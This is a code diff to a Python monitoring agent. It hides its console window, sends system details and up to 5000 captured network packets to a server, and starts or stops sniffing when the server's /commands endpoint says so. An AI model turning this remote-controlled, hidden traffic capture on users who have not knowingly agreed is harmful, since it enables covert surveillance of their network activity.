@@ -1,6 +1,15 @@
+import threading
+import time
+import signal
+import socket
+import httpx
 import ctypes
+import json
 import sys
 import os
+from system_info import get_system_info
+from packet_capture import start_sniff, stop_sniff, get_captured_packets, reset_packet_buffer, stop_sniff
+
 
 # hide console window
 hwnd = ctypes.windll.kernel32.GetConsoleWindow()
@@ -101,7 +110,7 @@ def main():
         payload = {
             'hostname': hostname,
             'data': get_system_info(),
-            'packets': get_captured_packets()[:50],
+            'packets': get_captured_packets()[:5000],
         }
         print(f"[DEBUG] Sending {len(payload['packets'])} packets to server")
 
@@ -113,10 +122,41 @@ def main():
 
     def agent_loop():
         nonlocal running
-        start_sniff()  # Start capturing packets
+        was_running = False
+
         while running:
+            cfg = load_config()
+            token = cfg.get('token') or request_approval()
+            if not token:
+                time.sleep(3)
+                continue
+
+            hostname = get_device_info()['hostname']
+
+            try:
+                # Ask server if capture should start/stop
+                r = httpx.get(f"{get_server_url()}/commands", params={"hostname": hostname}, timeout=5)
+                cmd = r.json().get("command", "")
+
+                if cmd == "start" and not was_running:
+                    print("[AGENT] Starting packet capture")
+                    start_sniff()
+                    was_running = True
+
+                elif cmd == "stop" and was_running:
+                    print("[AGENT] Stopping packet capture")
+                    stop_sniff()
+                    was_running = False
+
+            except Exception as e:
+                print(f"[ERROR] Command fetch failed: {e}")
+                time.sleep(3)
+
             send_system_info()
             time.sleep(1)
+
+
+
 
     def start_agent():
         nonlocal running, agent_thread
